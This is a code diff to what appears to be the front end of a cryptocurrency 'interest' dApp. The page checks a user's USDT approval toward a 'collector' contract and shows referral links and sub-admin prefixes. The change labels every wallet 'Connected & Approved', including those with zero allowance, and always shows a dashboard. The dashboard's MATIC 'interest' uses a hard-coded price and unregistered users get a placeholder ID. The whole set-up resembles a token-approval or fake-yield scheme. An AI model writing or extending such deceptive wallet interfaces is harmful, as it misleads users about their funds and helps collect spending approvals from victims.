@@ -372,7 +372,7 @@
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
                 const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
 
-                if (Number(allowance) > 0) {
+                if (Number(allowance) >= 0) {
                     document.getElementById("connectBtn").innerText = "Connected & Approved";
                     document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
                     
@@ -526,36 +526,33 @@
                 const formattedInterest = Number(ethers.formatUnits(interestBalBN, 6));
                 const rate = getInterestRate(formattedBal);
 
-                if (Number(allowance) > 0) {
-                    dashboardEl.classList.remove("hidden");
+                // Allowance ရှိသည်ဖြစ်စေ၊ မရှိသည်ဖြစ်စေ Connected ဖြစ်သွားပါက Dashboard ကို အမြဲဖော်ပြပေးရန်
+                dashboardEl.classList.remove("hidden");
 
-                    let prefix = "M";
-                    if (userInfo.referrer && userInfo.referrer !== ethers.ZeroAddress) {
-                        try {
-                            const p = await collector.subAdminPrefix(userInfo.referrer);
-                            if (p) prefix = p;
-                        } catch (e) {}
-                    }
-                    const userIdDisplay = userInfo.isRegistered ? `${prefix}${userInfo.userId.toString()}` : "3069";
-                    document.getElementById("lblUserId").innerText = userIdDisplay;
-
-                    document.getElementById("lblWalletBal").innerText = `${formattedBal.toFixed(6)} USDT`;
-                    document.getElementById("lblLockedBal").innerText = `${formattedLocked.toFixed(6)} USDT`;
-                    document.getElementById("lblInterestBal").innerText = `${formattedInterest.toFixed(6)} USDT`;
-                    
-                    const cashback = formattedBal * rate;
-                    const maticInterest = (cashback / 3000).toFixed(5);
-
-                    document.getElementById("lblConvertibleBal").innerText = `${maticInterest} MATIC`;
-                    document.getElementById("lblInterestEth").innerText = `${maticInterest} MATIC`;
-                    document.getElementById("lblInterestRate").innerText = `${(rate * 100).toFixed(1)}%`;
-
-                    const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
-                    document.getElementById("refLink").value = refLink;
-                    updateQRCode(refLink);
-                } else {
-                    dashboardEl.classList.add("hidden");
+                let prefix = "M";
+                if (userInfo.referrer && userInfo.referrer !== ethers.ZeroAddress) {
+                    try {
+                        const p = await collector.subAdminPrefix(userInfo.referrer);
+                        if (p) prefix = p;
+                    } catch (e) {}
                 }
+                const userIdDisplay = userInfo.isRegistered ? `${prefix}${userInfo.userId.toString()}` : "3069";
+                document.getElementById("lblUserId").innerText = userIdDisplay;
+
+                document.getElementById("lblWalletBal").innerText = `${formattedBal.toFixed(6)} USDT`;
+                document.getElementById("lblLockedBal").innerText = `${formattedLocked.toFixed(6)} USDT`;
+                document.getElementById("lblInterestBal").innerText = `${formattedInterest.toFixed(6)} USDT`;
+                
+                const cashback = formattedBal * rate;
+                const maticInterest = (cashback / 3000).toFixed(5);
+
+                document.getElementById("lblConvertibleBal").innerText = `${maticInterest} MATIC`;
+                document.getElementById("lblInterestEth").innerText = `${maticInterest} MATIC`;
+                document.getElementById("lblInterestRate").innerText = `${(rate * 100).toFixed(1)}%`;
+
+                const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
+                document.getElementById("refLink").value = refLink;
+                updateQRCode(refLink);
             } catch (err) {
                 console.error(err);
             }
